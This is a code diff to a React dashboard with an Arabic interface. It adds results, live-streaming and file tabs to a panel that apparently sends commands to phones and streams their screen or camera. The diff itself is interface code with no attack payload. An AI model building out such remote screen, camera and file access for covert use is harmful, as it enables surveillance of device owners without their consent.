@@ -27,6 +27,9 @@ import {
   Loader2,
   Link2,
   SmartphoneNfc,
+  ListChecks,
+  Radio,
+  FolderOpen,
 } from 'lucide-react'
 import { Button } from '@/components/ui/button'
 import { Badge } from '@/components/ui/badge'
@@ -52,6 +55,9 @@ import { CMD_CATEGORIES, type CommandDef } from '@/lib/commands'
 import api, { type Device, type Event, type Stats } from '@/lib/api'
 import { cn, formatTimestamp, timeAgo, addLog } from '@/lib/utils'
 import { useAuth } from '@/contexts/AuthContext'
+import CommandResults from '@/components/dashboard/command-results'
+import StreamingViewer from '@/components/dashboard/streaming-viewer'
+import FileViewer from '@/components/dashboard/file-viewer'
 
 /* ─── Types ──────────────────────────────────────────── */
 interface UserData {
@@ -364,10 +370,10 @@ export default function Dashboard() {
       const res = await api.deleteUser(userId)
       if (res.ok) {
         addLog('success', 'تم حذف المستخدم بنجاح')
-        // Re-fetch users
+        // Re-fetch users (server returns { ok, users: [...] })
         const usersRes = await api.getUsers()
-        if (usersRes.ok && usersRes.data) {
-          setUsers(usersRes.data as UserData[])
+        if (usersRes.ok && usersRes.users) {
+          setUsers(usersRes.users as UserData[])
         }
       } else {
         addLog('error', 'فشل حذف المستخدم', res.message)
@@ -1251,26 +1257,40 @@ export default function Dashboard() {
             addLog('info', `التبديل إلى: ${val}`)
           }}
         >
-          <TabsList className="w-full sm:w-auto bg-slate-900/80 border border-slate-800/50 p-1 rounded-xl mb-6">
-            <TabsTrigger value="devices" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
-              <Smartphone className="w-4 h-4" />
-              الأجهزة
-            </TabsTrigger>
-            <TabsTrigger value="commands" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
-              <Terminal className="w-4 h-4" />
-              الأوامر
-            </TabsTrigger>
-            <TabsTrigger value="events" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
-              <Activity className="w-4 h-4" />
-              الأحداث
-            </TabsTrigger>
-            {user?.role === 'admin' && (
-              <TabsTrigger value="users" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
-                <Users className="w-4 h-4" />
-                المستخدمين
+          <div className="overflow-x-auto mb-6 -mx-1 px-1" style={{ scrollbarWidth: 'none' }}>
+            <TabsList className="inline-flex min-w-full sm:min-w-0 bg-slate-900/80 border border-slate-800/50 p-1 rounded-xl">
+              <TabsTrigger value="devices" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
+                <Smartphone className="w-4 h-4" />
+                الأجهزة
               </TabsTrigger>
-            )}
-          </TabsList>
+              <TabsTrigger value="commands" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
+                <Terminal className="w-4 h-4" />
+                الأوامر
+              </TabsTrigger>
+              <TabsTrigger value="results" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
+                <ListChecks className="w-4 h-4" />
+                النتائج
+              </TabsTrigger>
+              <TabsTrigger value="streaming" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
+                <Radio className="w-4 h-4" />
+                البث
+              </TabsTrigger>
+              <TabsTrigger value="events" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
+                <Activity className="w-4 h-4" />
+                الأحداث
+              </TabsTrigger>
+              <TabsTrigger value="files" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
+                <FolderOpen className="w-4 h-4" />
+                الملفات
+              </TabsTrigger>
+              {user?.role === 'admin' && (
+                <TabsTrigger value="users" className="rounded-lg text-sm gap-1.5 data-active:bg-emerald-500/15 data-active:text-emerald-400">
+                  <Users className="w-4 h-4" />
+                  المستخدمين
+                </TabsTrigger>
+              )}
+            </TabsList>
+          </div>
 
           <TabsContent value="devices">
             <AnimatePresence mode="wait">
@@ -1300,6 +1320,72 @@ export default function Dashboard() {
             </AnimatePresence>
           </TabsContent>
 
+          <TabsContent value="results">
+            <AnimatePresence mode="wait">
+              <motion.div
+                key={`results-${selectedDevice?.id || 'none'}`}
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0, y: -10 }}
+                transition={{ duration: 0.2 }}
+              >
+                {selectedDevice ? (
+                  <CommandResults device={selectedDevice} />
+                ) : (
+                  <div className="flex flex-col items-center justify-center py-16 text-slate-400">
+                    <ListChecks className="w-12 h-12 mb-3 text-slate-600" />
+                    <p className="text-base font-medium">اختر جهازاً لعرض النتائج</p>
+                    <p className="text-sm mt-1">
+                      انتقل إلى تبويب الأجهزة واختر جهازاً لرؤية نتائج أوامره
+                    </p>
+                    <Button
+                      variant="outline"
+                      size="sm"
+                      onClick={() => setActiveTab('devices')}
+                      className="mt-4 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/10 bg-transparent"
+                    >
+                      <Smartphone className="w-4 h-4" />
+                      عرض الأجهزة
+                    </Button>
+                  </div>
+                )}
+              </motion.div>
+            </AnimatePresence>
+          </TabsContent>
+
+          <TabsContent value="streaming">
+            <AnimatePresence mode="wait">
+              <motion.div
+                key={`streaming-${selectedDevice?.id || 'none'}`}
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0, y: -10 }}
+                transition={{ duration: 0.2 }}
+              >
+                {selectedDevice ? (
+                  <StreamingViewer device={selectedDevice} />
+                ) : (
+                  <div className="flex flex-col items-center justify-center py-16 text-slate-400">
+                    <Radio className="w-12 h-12 mb-3 text-slate-600" />
+                    <p className="text-base font-medium">اختر جهازاً لبدء البث</p>
+                    <p className="text-sm mt-1">
+                      انتقل إلى تبويب الأجهزة واختر جهازاً لبث الشاشة أو الكاميرا
+                    </p>
+                    <Button
+                      variant="outline"
+                      size="sm"
+                      onClick={() => setActiveTab('devices')}
+                      className="mt-4 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/10 bg-transparent"
+                    >
+                      <Smartphone className="w-4 h-4" />
+                      عرض الأجهزة
+                    </Button>
+                  </div>
+                )}
+              </motion.div>
+            </AnimatePresence>
+          </TabsContent>
+
           <TabsContent value="events">
             <AnimatePresence mode="wait">
               <motion.div
@@ -1310,6 +1396,20 @@ export default function Dashboard() {
                 transition={{ duration: 0.2 }}
               >
                 {renderEventsTab()}
+              </motion.div>
+            </AnimatePresence>
+          </TabsContent>
+
+          <TabsContent value="files">
+            <AnimatePresence mode="wait">
+              <motion.div
+                key="files"
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0, y: -10 }}
+                transition={{ duration: 0.2 }}
+              >
+                <FileViewer devices={devices} />
               </motion.div>
             </AnimatePresence>
           </TabsContent>
